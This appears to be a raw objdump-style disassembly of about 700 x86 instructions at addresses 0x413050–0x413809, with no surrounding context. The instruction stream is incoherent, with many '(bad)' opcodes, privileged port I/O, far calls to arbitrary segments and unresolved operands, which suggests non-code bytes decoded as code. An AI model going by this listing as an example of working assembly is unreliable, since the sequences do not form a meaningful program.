  413050:	or     BYTE PTR [esi-0x63],al
  413053:	add    esi,eax
  413055:	push   es
  413056:	int3   
  413057:	cmp    esp,DWORD PTR [ebp-0x43]
  41305a:	sbb    eax,0xbc53b95c
  41305f:	mov    bh,0x52
  413061:	jle    0x4130d4
  413063:	pop    DWORD PTR [ebp-0x6a]
  413066:	sub    al,0x64
  413068:	cmp    eax,0xfa9a3fd4
  41306d:	cdq    
  41306e:	(bad)  
  41306f:	test   al,0x5c
  413071:	cld    
  413072:	jae    0x41304c
  413074:	in     al,0x4d
  413076:	push   edx
  413077:	jecxz  0x4130a5
  413079:	cli    
  41307a:	add    eax,0x205c4f21
  41307f:	mov    ebp,0x5e51fdd3
  413084:	mov    edi,esp
  413086:	gs clc 
  413088:	leave  
  413089:	addr16 ret 
  41308b:	cmp    DWORD PTR ds:0x73c626be,edx
  413091:	sbb    al,0xb
  413093:	pop    edi
  413094:	inc    edi
  413095:	pop    ds
  413096:	mov    ah,BYTE PTR [ebp-0x44]
  413099:	in     al,0x61
  41309b:	mov    eax,0xe41c07ca
  4130a0:	aam    0xca
  4130a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130a3:	call   DWORD PTR [esi-0x3c]
  4130a6:	ret    
  4130a7:	mov    WORD PTR [ebx+0x38],cs
  4130aa:	cld    
  4130ab:	test   DWORD PTR [eax+0x38],eax
  4130ae:	imul   edx,DWORD PTR [edi+0x1a],0x71620219
  4130b5:	gs ja  0x41303a
  4130b8:	rol    DWORD PTR [edx],0x42
  4130bb:	adc    ebx,DWORD PTR [ecx-0x7d]
  4130be:	mov    ecx,0xb81aaad8
  4130c3:	cmp    BYTE PTR [edx+0x4d],ch
  4130c6:	lds    ebx,FWORD PTR [esi+eax*1]
  4130c9:	adc    eax,0xb618f795
  4130ce:	js     0x41307f
  4130d0:	add    BYTE PTR [ecx+ebx*1+0xa372a57],0xc4
  4130d8:	repnz fidiv DWORD PTR [ebx+ebx*2+0xcfc14c2]
  4130e0:	xchg   BYTE PTR [ebx+0x7a],bh
  4130e3:	call   0x7f78:0xc7b959fd
  4130ea:	cmp    al,BYTE PTR [edx-0x32ad0ffb]
  4130f0:	adc    eax,0x263aca7f
  4130f5:	and    al,0xfc
  4130f7:	add    esp,DWORD PTR [ebx-0x7a]
  4130fa:	sbb    DWORD PTR [ebx-0x4be8d3f6],edi
  413100:	fdiv   DWORD PTR [eax]
  413102:	jle    0x413181
  413104:	lahf   
  413105:	cmp    BYTE PTR [edx],ch
  413107:	or     eax,0xd4b194e
  41310c:	jae    0x413115
  41310e:	xchg   edx,eax
  41310f:	sbb    al,BYTE PTR [edx-0x4b1a1491]
  413115:	adc    eax,esi
  413117:	std    
  413118:	jmp    0x4d68:0xfc9381f7
  41311f:	fs pop esp
  413121:	jo     0x413153
  413123:	pushf  
  413124:	push   0x5f524534
  413129:	jl     0x41317a
  41312b:	inc    esp
  41312c:	idiv   DWORD PTR [edx+0x792ad9fb]
  413132:	loope  0x4131b0
  413134:	aad    0x89
  413136:	cmp    ecx,DWORD PTR [edx+0x70d30123]
  41313c:	adc    al,0xfd
  41313e:	mov    eax,ds:0x6df8f9f1
  413143:	cld    
  413144:	push   cs
  413145:	lock dec edx
  413147:	jne    0x413118
  413149:	pop    esi
  41314a:	jle    0x4131ab
  41314c:	pop    ss
  41314d:	jns    0x4130d3
  41314f:	adc    dl,0x7e
  413152:	cdq    
  413153:	sar    BYTE PTR [ebx],cl
  413155:	(bad)  
  413156:	aam    0x2e
  413158:	mov    al,0x4e
  41315a:	jns    0x4131db
  41315c:	cdq    
  41315d:	into   
  41315e:	std    
  41315f:	gs (bad) 
  413161:	xor    DWORD PTR [edi+0x18],eax
  413164:	pop    edx
  413165:	sbb    al,0xd0
  413167:	jge    0x4131c2
  413169:	xchg   esi,eax
  41316a:	push   ss
  41316b:	xchg   edi,eax
  41316c:	pop    es
  41316d:	iret   
  41316e:	scas   eax,DWORD PTR es:[edi]
  41316f:	fwait
  413170:	push   ebp
  413171:	std    
  413172:	dec    edi
  413173:	or     esp,0x27
  413176:	inc    BYTE PTR [ebx]
  413178:	mov    al,0x96
  41317a:	fld    DWORD PTR [ecx]
  41317c:	nop
  41317d:	jecxz  0x413133
  41317f:	mov    ecx,0xae405bd
  413184:	pop    edx
  413185:	mov    dl,0x1f
  413187:	push   0xffffffaa
  413189:	fisttp WORD PTR [ecx+0x68]
  41318c:	fisttp WORD PTR gs:[edi-0x7a]
  413190:	pop    edi
  413191:	aad    0x6
  413193:	hlt    
  413194:	lods   eax,DWORD PTR ds:[esi]
  413195:	jp     0x413136
  413197:	mov    ds:0x5cbcb472,al
  41319c:	jno    0x41321b
  41319e:	xor    al,0xc3
  4131a0:	lahf   
  4131a1:	ror    DWORD PTR [ebx-0x1a],cl
  4131a4:	dec    ebx
  4131a5:	xor    al,BYTE PTR [eax+0x33537a14]
  4131ab:	sahf   
  4131ac:	lods   al,BYTE PTR ds:[esi]
  4131ad:	cmp    BYTE PTR [eax],bl
  4131af:	and    al,0x53
  4131b1:	ror    ebx,0xc3
  4131b4:	stc    
  4131b5:	js     0x4131f5
  4131b7:	adc    DWORD PTR [esp+ecx*2-0x651ac9af],esp
  4131be:	mov    ds:0x6d012392,eax
  4131c3:	cwde   
  4131c4:	inc    edi
  4131c5:	cs or  DWORD PTR gs:[edi],edi
  4131c9:	adc    BYTE PTR [esi+ecx*4-0x6a],0x89
  4131ce:	nop
  4131cf:	mov    al,0xa2
  4131d1:	dec    eax
  4131d2:	retf   0x5016
  4131d5:	pop    ds
  4131d6:	icebp  
  4131d7:	ins    BYTE PTR es:[edi],dx
  4131d8:	aad    0x6
  4131da:	cwde   
  4131db:	ret    
  4131dc:	outs   dx,DWORD PTR ds:[esi]
  4131dd:	push   0xffffff89
  4131df:	mov    eax,ds:0xdef8082c
  4131e4:	cwde   
  4131e5:	ins    BYTE PTR es:[edi],dx
  4131e6:	shl    BYTE PTR [edx-0x1e961300],1
  4131ec:	(bad)  
  4131ed:	mov    cl,0x1d
  4131ef:	and    cl,BYTE PTR [ecx-0x2d]
  4131f2:	test   al,0x92
  4131f4:	pop    ss
  4131f5:	je     0x413200
  4131f7:	clc    
  4131f8:	(bad)  
  4131f9:	mov    bl,BYTE PTR [esi-0x6821dad3]
  4131ff:	hlt    
  413200:	clc    
  413201:	iret   
  413202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413203:	call   0x5724:0xd87bcad6
  41320a:	call   0x4043:0xa9152114
  413211:	pop    esi
  413212:	pop    edx
  413213:	jg     0x413224
  413215:	xor    al,0xc8
  413217:	arpl   WORD PTR [edx-0x3f131687],di
  41321d:	cmp    BYTE PTR [ebx+0x63],0x65
  413221:	add    BYTE PTR ds:0x2f56fcd4,cl
  413227:	mov    ah,0xc3
  413229:	xor    DWORD PTR [ebx+0x54],esi
  41322c:	sub    al,0xba
  41322e:	mov    ds:0xba87a3ed,eax
  413233:	cmp    eax,0x1f6630c7
  413238:	pop    edi
  413239:	fimul  DWORD PTR [ecx+0x2b94fae1]
  41323f:	xor    eax,DWORD PTR [edx+0x3c8369e4]
  413245:	mov    dh,0x15
  413247:	lds    eax,FWORD PTR [eax+0x37]
  41324a:	sbb    al,0xa
  41324c:	xchg   ebp,ebx
  41324e:	jae    0x413220
  413250:	cmp    DWORD PTR [eax+0x75377fbd],esi
  413256:	push   0x7e
  413258:	sbb    edi,ecx
  41325a:	test   BYTE PTR [edx-0x3033d04f],ah
  413260:	inc    esi
  413261:	mov    ebp,0x814fafcc
  413266:	(bad)  
  413267:	packuswb mm2,mm7
  41326a:	lods   al,BYTE PTR ds:[esi]
  41326b:	into   
  41326c:	(bad)  [edx-0x16]
  41326f:	xchg   ebp,eax
  413270:	mov    DWORD PTR [edi-0x7a],ecx
  413273:	jno    0x413257
  413275:	jb     0x413261
  413277:	test   al,0x59
  413279:	dec    ebx
  41327a:	sub    ecx,esp
  41327c:	adc    BYTE PTR [edx-0x4b69806c],al
  413282:	test   BYTE PTR [ebx+ebp*2-0x58],al
  413286:	pop    edx
  413287:	jmp    0x9adf8131
  41328c:	scas   al,BYTE PTR es:[edi]
  41328d:	push   es
  41328e:	call   0x794d:0xc73fe7d
  413295:	adc    eax,0x7060817
  41329a:	mov    ds:0x2da705dd,al
  41329f:	out    dx,eax
  4132a0:	les    ebp,FWORD PTR [eax-0xc]
  4132a3:	and    eax,0x3136c27b
  4132a8:	pop    ebx
  4132a9:	xor    BYTE PTR ds:0x1674106a,bl
  4132af:	dec    edi
  4132b0:	pop    ebp
  4132b1:	clc    
  4132b2:	stos   DWORD PTR es:[edi],eax
  4132b3:	scas   eax,DWORD PTR es:[edi]
  4132b4:	ret    
  4132b5:	(bad)  
  4132b6:	pop    edx
  4132b7:	lds    esi,FWORD PTR [edx-0x77092bf4]
  4132bd:	aas    
  4132be:	out    0xed,eax
  4132c0:	add    DWORD PTR [ebp+0x727059ca],eax
  4132c6:	inc    edi
  4132c7:	sbb    eax,0x8d60080b
  4132cc:	push   edx
  4132cd:	cmc    
  4132ce:	in     eax,0x83
  4132d0:	add    eax,0x705da36b
  4132d5:	in     al,dx
  4132d6:	clc    
  4132d7:	sub    BYTE PTR [ebx+0x47],dl
  4132da:	and    eax,0xdc3625ea
  4132df:	xor    eax,0xd15fa669
  4132e4:	adc    al,0x29
  4132e6:	pop    esp
  4132e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132e8:	pop    esp
  4132e9:	inc    ecx
  4132ea:	pop    ecx
  4132eb:	inc    ebx
  4132ec:	jmp    0x413276
  4132ee:	bnd jl 0x41328d
  4132f1:	es mov ecx,0x277a88e0
  4132f7:	int3   
  4132f8:	or     BYTE PTR [esi-0x4b],ah
  4132fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132fc:	(bad)  
  4132fd:	cld    
  4132fe:	cmp    al,0xdb
  413300:	fdiv   QWORD PTR [edi-0x27]
  413303:	repnz xchg edx,eax
  413305:	test   al,0x12
  413307:	retf   0x948c
  41330a:	mov    ds:0xa09354cf,eax
  41330f:	dec    edi
  413310:	xor    DWORD PTR ds:0x3bb84e11,eax
  413316:	jno    0x413321
  413318:	push   cs
  413319:	mov    esi,0xe491569c
  41331e:	xor    ebp,DWORD PTR [ebp-0x25e4629b]
  413324:	int3   
  413325:	push   edi
  413326:	push   ebp
  413327:	mov    BYTE PTR [eax-0x72],cl
  41332a:	add    DWORD PTR [edi-0x6c],eax
  41332d:	xlat   BYTE PTR ds:[ebx]
  41332e:	sbb    al,0x7e
  413330:	sahf   
  413331:	dec    edi
  413332:	enter  0x8bff,0xbe
  413336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413337:	adc    DWORD PTR [eax+0x460e5b80],ecx
  41333d:	xchg   BYTE PTR [ecx-0x25e3f0a2],bh
  413343:	and    ebp,DWORD PTR [ecx]
  413345:	inc    edi
  413346:	push   esp
  413347:	idiv   BYTE PTR [edx-0x56]
  41334a:	mov    ch,0xb4
  41334c:	in     eax,0x9e
  41334e:	out    dx,al
  41334f:	pop    ds
  413350:	and    ebx,DWORD PTR [eax]
  413352:	test   BYTE PTR [ebx+0xced29eb],bh
  413358:	test   BYTE PTR [ecx+ecx*8+0x7],al
  41335c:	add    cl,bh
  41335e:	cmp    ch,BYTE PTR [ebp+0x42]
  413361:	pusha  
  413362:	mov    ds:0xcaeadf22,al
  413367:	mov    bh,0x83
  413369:	push   ebp
  41336a:	aas    
  41336b:	and    al,0x2c
  41336d:	jne    0x41331e
  41336f:	loop   0x4133e0
  413371:	inc    esp
  413372:	fs pushf 
  413374:	fdiv   QWORD PTR [edx-0x15f7c69]
  41337a:	sbb    eax,0x20699080
  41337f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413380:	and    al,0xec
  413382:	iret   
  413383:	sub    cl,BYTE PTR [ecx-0x499a330]
  413389:	jnp    0x41331c
  41338b:	sbb    ah,BYTE PTR ds:0xe6037edf
  413391:	pop    ss
  413392:	mov    BYTE PTR [ebx+esi*4],0xe3
  413396:	mov    ch,0xfc
  413398:	mov    eax,ds:0x92936bd3
  41339d:	cmp    eax,0xb7d2622a
  4133a2:	push   0x7fb7d3d5
  4133a7:	stos   DWORD PTR es:[edi],eax
  4133a8:	test   eax,0x6f4ece3d
  4133ad:	sar    BYTE PTR [ecx-0x48],0xc1
  4133b1:	cli    
  4133b2:	test   al,0x6
  4133b4:	out    dx,al
  4133b5:	and    DWORD PTR [esi],edx
  4133b7:	cmp    esp,ebx
  4133b9:	add    dl,BYTE PTR [ebx+0x2a613a90]
  4133bf:	xchg   ecx,eax
  4133c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133c1:	sub    DWORD PTR [eax],edi
  4133c3:	mov    esi,0xf4998216
  4133c8:	sar    DWORD PTR [edx+ebx*2],cl
  4133cb:	or     cl,BYTE PTR [eax-0x62]
  4133ce:	xor    ebp,DWORD PTR [esp+ebx*8]
  4133d1:	enter  0x54df,0x8
  4133d5:	dec    esp
  4133d6:	jne    0x413361
  4133d8:	ss cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4133db:	enter  0x7acc,0xf5
  4133df:	inc    edi
  4133e0:	loopne 0x413419
  4133e2:	fistp  DWORD PTR [edx-0x2f0dddd1]
  4133e8:	xor    DWORD PTR [esi+0x6c],esp
  4133eb:	or     al,0x74
  4133ed:	cmp    eax,0x8faad82
  4133f2:	test   al,0x25
  4133f4:	mov    esi,0x66d22485
  4133f9:	cmp    al,0x9e
  4133fb:	lods   al,BYTE PTR ds:[esi]
  4133fc:	mov    bh,0xa0
  4133fe:	out    0x58,al
  413400:	repz adc al,0xbb
  413403:	mov    ds:0xad28298,al
  413408:	outs   dx,DWORD PTR ds:[esi]
  413409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41340a:	fidiv  WORD PTR [ebx]
  41340d:	inc    ebp
  41340e:	jns    0x41343b
  413410:	mov    fs,WORD PTR [ebx]
  413412:	ds lahf 
  413414:	loope  0x413471
  413416:	mov    ds:0x336203,eax
  41341b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41341d:	dec    edx
  41341e:	jg     0x413404
  413420:	xor    eax,0x3ba89ee3
  413425:	adc    dh,al
  413427:	repnz or ebp,DWORD PTR fs:[ecx+0x9]
  41342c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41342d:	jmp    DWORD PTR [ecx+0x15]
  413430:	xor    al,BYTE PTR [ebx]
  413432:	and    edx,DWORD PTR [ebx]
  413434:	shl    DWORD PTR [edi+ebx*8-0x1f68615a],0x91
  41343c:	lods   al,BYTE PTR ds:[esi]
  41343d:	pop    ebp
  41343e:	daa    
  41343f:	(bad)  
  413440:	sub    DWORD PTR [ecx+0x2a],eax
  413443:	bound  esi,QWORD PTR [ebp+0x1f]
  413446:	pop    eax
  413447:	repnz pusha 
  413449:	dec    esp
  41344a:	test   al,0x43
  41344c:	mov    eax,0x9fbc665
  413451:	into   
  413452:	sti    
  413453:	outs   dx,DWORD PTR ds:[esi]
  413454:	pop    ebp
  413455:	xor    eax,0x2bad3f39
  41345a:	lea    ebx,[ebp+ecx*4+0xbd26f8d]
  413461:	rcl    DWORD PTR [ebx-0x7c6ccf1a],1
  413467:	das    
  413468:	or     dh,ah
  41346a:	fiadd  WORD PTR [eax-0x75]
  41346d:	mul    BYTE PTR [esi]
  41346f:	mov    ds:0xf7e9d341,eax
  413474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413475:	mov    eax,0xeee36034
  41347a:	xchg   cl,dl
  41347c:	adc    al,0x26
  41347e:	cs retf 
  413480:	test   DWORD PTR [edx-0x67b1e2c1],ebx
  413486:	(bad)  
  413487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413488:	out    0x0,al
  41348a:	xor    eax,0x6f6e7530
  41348f:	dec    ebx
  413490:	arpl   WORD PTR [ecx],bx
  413492:	jae    0x4134c4
  413494:	mov    bl,BYTE PTR [ebp-0x158f70e9]
  41349a:	dec    BYTE PTR [edx-0x12f067e6]
  4134a0:	fs xor eax,0x8d0c8a0a
  4134a6:	js     0x413513
  4134a8:	shl    ebx,cl
  4134aa:	es out dx,eax
  4134ac:	(bad)  
  4134ad:	xor    al,0x7c
  4134af:	push   edx
  4134b0:	mov    ah,0x8f
  4134b2:	imul   ecx,ecx,0xffffff8b
  4134b5:	xchg   ebp,eax
  4134b6:	adc    edx,eax
  4134b8:	inc    edx
  4134b9:	ds fcmovnu st,st(7)
  4134bc:	stos   BYTE PTR es:[edi],al
  4134bd:	fist   WORD PTR [edi]
  4134bf:	or     eax,0x277238db
  4134c4:	scas   al,BYTE PTR es:[edi]
  4134c5:	cmc    
  4134c6:	pop    ecx
  4134c7:	xchg   esp,eax
  4134c8:	mov    al,0x95
  4134ca:	(bad)  
  4134cb:	fmul   QWORD PTR [ebx+ebp*2]
  4134ce:	mov    WORD PTR [eax+esi*2+0x2426295d],?
  4134d5:	sub    eax,0xbf09b577
  4134da:	inc    di
  4134dc:	jo     0x41352e
  4134de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134df:	sahf   
  4134e0:	cmp    esi,ecx
  4134e2:	pslld  mm7,mm6
  4134e5:	sub    edx,DWORD PTR [edx+0x22]
  4134e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134e9:	or     esi,DWORD PTR [edi-0x713fdbae]
  4134ef:	cmc    
  4134f0:	adc    eax,0xca60bc0c
  4134f5:	mov    esi,0xfe8e6995
  4134fa:	test   ecx,ebx
  4134fc:	es sub ch,bl
  4134ff:	(bad)  
  413500:	jle    0x41351d
  413502:	pop    esp
  413503:	(bad)  [edi]
  413505:	adc    al,0x50
  413507:	sbb    al,0xed
  413509:	mov    dh,0x68
  41350b:	xchg   edi,eax
  41350c:	pop    edx
  41350d:	in     eax,0x76
  41350f:	leave  
  413510:	mov    edi,es
  413512:	div    BYTE PTR [ecx+0x550218c8]
  413518:	inc    ebx
  413519:	mov    ah,BYTE PTR [edx+edx*1+0x4fd21f9b]
  413520:	imul   ebx,DWORD PTR [edi-0x3ceb0daf],0x35
  413527:	or     eax,0xcd3effc8
  41352c:	dec    ecx
  41352d:	jne    0x41350f
  41352f:	jle    0x413525
  413531:	cmp    BYTE PTR [ecx],ch
  413533:	in     eax,dx
  413534:	mov    fs,WORD PTR [esi]
  413536:	outs   dx,DWORD PTR ds:[esi]
  413537:	into   
  413538:	sahf   
  413539:	mov    edi,0xd9f183d0
  41353e:	push   ss
  41353f:	cdq    
  413540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413541:	sbb    BYTE PTR [ebx+0x50fa9b4f],bh
  413547:	lods   eax,DWORD PTR ds:[esi]
  413548:	cs cdq 
  41354a:	xor    eax,0xb2132128
  41354f:	jle    0x413516
  413551:	adc    eax,0xe4871a2a
  413556:	mov    ?,WORD PTR [esi-0x78]
  413559:	cmp    eax,0xa6b80dff
  41355e:	or     al,0xa9
  413560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413561:	test   eax,0x8eb9efa3
  413566:	retf   
  413567:	sub    eax,0xc16361b6
  41356c:	retf   0xcc8e
  41356f:	loopne 0x4135d7
  413571:	pop    es
  413572:	pop    esi
  413573:	les    esp,FWORD PTR [edx+0x5083f2a2]
  413579:	sbb    al,0xfa
  41357b:	ror    al,cl
  41357d:	loopne 0x413590
  41357f:	sub    ebp,esi
  413581:	push   ss
  413582:	aas    
  413583:	xlat   BYTE PTR ds:[ebx]
  413584:	pop    ecx
  413585:	push   ds
  413586:	loopne 0x4135ef
  413588:	mov    edi,0x337f2a7c
  41358d:	add    DWORD PTR [ecx],0x1277630b
  413593:	push   0xffffffc0
  413595:	push   es
  413596:	xchg   edi,eax
  413597:	dec    ebx
  413598:	sub    BYTE PTR [eax],al
  41359a:	adc    eax,0xb249b76
  41359f:	retf   
  4135a0:	popa   
  4135a1:	xchg   BYTE PTR [eax],ch
  4135a3:	inc    edi
  4135a4:	xor    al,0x8c
  4135a6:	outs   dx,DWORD PTR ds:[esi]
  4135a7:	aad    0x77
  4135a9:	jge    0x413625
  4135ab:	test   DWORD PTR ss:0x87739787,edi
  4135b2:	ja     0x4135e1
  4135b4:	xor    DWORD PTR ds:0x80ff3cdd,eax
  4135ba:	jmp    0x20b1:0x2a2c1877
  4135c1:	fimul  DWORD PTR [edi-0x194a789f]
  4135c7:	inc    esi
  4135c8:	in     al,0xc4
  4135ca:	jmp    0x4135e8
  4135cc:	in     eax,dx
  4135cd:	xchg   esi,eax
  4135ce:	or     BYTE PTR [ecx],dl
  4135d0:	test   edx,0x2cbe68ac
  4135d6:	std    
  4135d7:	fadd   st(7),st
  4135d9:	lods   al,BYTE PTR ds:[esi]
  4135da:	hlt    
  4135db:	mov    ah,0xb8
  4135dd:	xlat   BYTE PTR ds:[ebx]
  4135de:	push   ss
  4135df:	adc    al,0xbd
  4135e1:	fdiv   QWORD PTR [eax+0x6deb4252]
  4135e7:	icebp  
  4135e8:	loope  0x413631
  4135ea:	sub    ecx,DWORD PTR [edi-0x47]
  4135ed:	cwde   
  4135ee:	xor    DWORD PTR [ecx-0x3ddf852b],ecx
  4135f4:	push   edx
  4135f5:	int3   
  4135f6:	dec    esp
  4135f7:	out    dx,al
  4135f8:	cdq    
  4135f9:	sahf   
  4135fa:	rcr    ecx,cl
  4135fc:	cld    
  4135fd:	retf   0xb77a
  413600:	inc    esi
  413601:	cs arpl WORD PTR cs:[esi],sp
  413605:	enter  0xf7fe,0xc3
  413609:	packuswb mm4,QWORD PTR cs:[ecx-0xb]
  41360e:	stos   BYTE PTR es:[edi],al
  41360f:	adc    bl,BYTE PTR [edx+0x66be69b2]
  413615:	in     al,0x2c
  413617:	mov    esp,DWORD PTR ds:0x6b63ee99
  41361d:	jge    0x41366b
  41361f:	mov    ah,0x60
  413621:	in     al,0x4c
  413623:	mov    eax,ds:0x28ee66ed
  413628:	lds    ecx,FWORD PTR [edi]
  41362a:	popa   
  41362b:	xor    DWORD PTR [esi-0xf],edi
  41362e:	bound  esp,QWORD PTR [esi+edi*8]
  413631:	bound  ebp,QWORD PTR [eax+0x3d]
  413634:	mov    bl,0xc1
  413636:	(bad)  
  413637:	pushf  
  413638:	ret    0xf1b2
  41363b:	mov    ebx,0xd838b67
  413640:	xchg   esi,eax
  413641:	scas   eax,DWORD PTR es:[edi]
  413642:	hlt    
  413643:	sub    BYTE PTR [edi-0x27d239b],al
  413649:	mov    al,ds:0x71b0496f
  41364e:	(bad)  
  413650:	outs   dx,BYTE PTR ds:[esi]
  413651:	xor    dl,BYTE PTR [edx+0x37f4016]
  413657:	jns    0x41366c
  413659:	dec    ecx
  41365a:	mov    ebx,0x35a7862f
  41365f:	outs   dx,DWORD PTR ds:[esi]
  413660:	inc    ecx
  413661:	xchg   ecx,eax
  413662:	fsub   QWORD PTR [edi]
  413664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413665:	adc    DWORD PTR [edi+ebx*4],ecx
  413668:	pop    esi
  413669:	imul   ebx,DWORD PTR [ebx+0x71a329ae],0xffffffe8
  413670:	stos   DWORD PTR es:[edi],eax
  413671:	push   es
  413672:	jecxz  0x413698
  413674:	(bad)  
  413675:	arpl   WORD PTR [ebx+0x6729b69],sp
  41367b:	test   al,0xc5
  41367d:	sub    BYTE PTR [esp+edx*8-0xe],dl
  413681:	xchg   edi,eax
  413682:	sub    BYTE PTR [ecx+0x7d9d2f2],cl
  413688:	inc    ebx
  413689:	jnp    0x4136db
  41368b:	inc    edi
  41368c:	imul   esp,DWORD PTR [edx-0x74],0x23d9befe
  413693:	cmp    al,0x2d
  413695:	loop   0x413690
  413697:	dec    ecx
  413698:	out    0x8b,al
  41369a:	jne    0x41369e
  41369c:	xchg   ch,dl
  41369e:	test   cl,al
  4136a0:	out    0x6b,eax
  4136a2:	mov    eax,ds:0x2ed11900
  4136a7:	xor    BYTE PTR [ecx],ch
  4136a9:	mov    ?,WORD PTR [edi]
  4136ab:	dec    eax
  4136ac:	xchg   ecx,eax
  4136ad:	mov    DWORD PTR [edx-0x395c215b],edx
  4136b3:	cwde   
  4136b4:	push   0xdc00117a
  4136b9:	gs icebp 
  4136bb:	xor    BYTE PTR [ecx-0x44],bh
  4136be:	mov    dl,0x48
  4136c0:	leave  
  4136c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136c2:	mov    ebp,0x70c477bb
  4136c7:	popa   
  4136c8:	add    bh,BYTE PTR [esi+0x30aa650]
  4136ce:	ficomp WORD PTR [esp+ebx*2+0x4e]
  4136d2:	fwait
  4136d3:	test   ebp,eax
  4136d5:	or     BYTE PTR [esi-0x5],bh
  4136d8:	in     al,dx
  4136d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136db:	aaa    
  4136dc:	push   cs
  4136dd:	ds addr16 daa 
  4136e0:	imul   ebx,DWORD PTR fs:[eax+0x5e3e6d70],0x55
  4136e8:	stos   DWORD PTR es:[edi],eax
  4136e9:	sub    eax,DWORD PTR [edi]
  4136eb:	aaa    
  4136ec:	pushf  
  4136ed:	push   0x4e74ba2e
  4136f2:	mov    DWORD PTR ds:0xca78ea6f,esi
  4136f8:	xchg   ebp,eax
  4136f9:	sahf   
  4136fa:	xchg   edi,eax
  4136fb:	shr    bh,0xa0
  4136fe:	int3   
  4136ff:	sub    DWORD PTR [ecx+0xd53fb2f],0xf16ef20b
  413709:	scas   eax,DWORD PTR es:[edi]
  41370a:	(bad)  
  41370b:	pop    edi
  41370c:	mov    ds:0x28d6fea9,al
  413711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413712:	pusha  
  413713:	push   ebp
  413714:	aad    0x93
  413716:	nop
  413717:	jmp    0xfb4b:0xd5232712
  41371e:	mov    BYTE PTR [ebx+0x6b5b7bc0],dl
  413724:	dec    ecx
  413725:	(bad)  
  413726:	int    0x3b
  413728:	aaa    
  413729:	xor    esi,esp
  41372b:	or     BYTE PTR [edx+0x4e],bl
  41372e:	cmp    BYTE PTR [ebx+0x79],ch
  413731:	push   ebx
  413732:	(bad)  
  413733:	pop    ebx
  413734:	js     0x4136e9
  413736:	jo     0x41372b
  413738:	push   ss
  413739:	mov    ah,0x61
  41373b:	ins    BYTE PTR es:[edi],dx
  41373c:	popa   
  41373d:	push   0x68b2b42a
  413742:	pop    ecx
  413743:	jb     0x4136da
  413745:	xlat   BYTE PTR ds:[ebx]
  413746:	dec    edx
  413747:	lods   ax,WORD PTR ds:[esi]
  413749:	(bad)
  41374d:	loope  0x4136e1
  41374f:	push   DWORD PTR [ebx]
  413751:	xchg   DWORD PTR [ebp+ecx*4+0xe4f133e],esp
  413758:	aas    
  413759:	push   edx
  41375a:	cmp    ebx,esp
  41375c:	pushf  
  41375d:	out    0x39,eax
  41375f:	jecxz  0x4136e4
  413761:	or     edi,DWORD PTR [edx-0x118deb79]
  413767:	xor    DWORD PTR [eax+0x79],esi
  41376a:	xchg   esi,eax
  41376b:	(bad)  
  41376c:	outs   dx,DWORD PTR ds:[esi]
  41376d:	loopne 0x413795
  41376f:	inc    ebp
  413770:	cmp    al,0x9f
  413772:	dec    ebp
  413773:	lock hlt 
  413775:	loopne 0x413751
  413777:	adc    al,0x33
  413779:	fst    QWORD PTR [ecx]
  41377b:	outs   dx,DWORD PTR ds:[esi]
  41377c:	scas   eax,DWORD PTR es:[edi]
  41377d:	test   al,0xba
  41377f:	ja     0x4137f2
  413781:	xor    ecx,0xb8cda673
  413787:	pop    ss
  413788:	pop    eax
  413789:	scas   al,BYTE PTR es:[edi]
  41378a:	xchg   esi,eax
  41378b:	mov    esi,0xb1a639fc
  413790:	xor    al,0x97
  413792:	cdq    
  413793:	xchg   ebp,eax
  413794:	in     eax,dx
  413795:	popa   
  413796:	outs   dx,BYTE PTR ds:[esi]
  413797:	aam    0x9b
  413799:	add    BYTE PTR ds:0xf884e055,al
  41379f:	or     ch,BYTE PTR [eax+0x18287e6e]
  4137a5:	call   0xc46e:0x5714b006
  4137ac:	jns    0x413749
  4137ae:	retf   0x6385
  4137b1:	pop    ebx
  4137b2:	push   ecx
  4137b3:	xor    BYTE PTR [ecx-0x6bb5e2d9],bl
  4137b9:	jge    0x41374f
  4137bb:	adc    al,0x10
  4137bd:	sbb    bh,BYTE PTR [edx+0x60e08bda]
  4137c3:	jns    0x41376f
  4137c5:	adc    cl,BYTE PTR [ecx+eax*1]
  4137c8:	ficom  DWORD PTR [esi+0x4f76df23]
  4137ce:	iret   
  4137cf:	je     0x413791
  4137d1:	pop    esi
  4137d2:	pop    ds
  4137d3:	js     0x4137a2
  4137d5:	jmp    0xb701e8fa
  4137da:	test   al,0xf2
  4137dc:	scas   al,BYTE PTR es:[edi]
  4137dd:	xchg   bl,dl
  4137df:	cld    
  4137e0:	retf   0x33b9
  4137e3:	lahf   
  4137e4:	pop    ds
  4137e5:	test   DWORD PTR [ebx-0x708794e7],ebp
  4137eb:	scas   al,BYTE PTR es:[edi]
  4137ec:	mov    eax,ds:0x6a8bcefb
  4137f1:	push   0xbbcaf5cb
  4137f6:	or     DWORD PTR [eax],esi
  4137f8:	pop    ds
  4137f9:	xchg   esi,eax
  4137fa:	add    ah,BYTE PTR [edx+0x74]
  4137fd:	pop    ebx
  4137fe:	(bad)  
  4137ff:	adc    al,0xf3
  413801:	jmp    DWORD PTR [eax+esi*4+0x3c]
  413805:	adc    al,0x4f
  413807:	xchg   BYTE PTR [ecx],bh
  413809:	mov    ecx,0x2270ed9
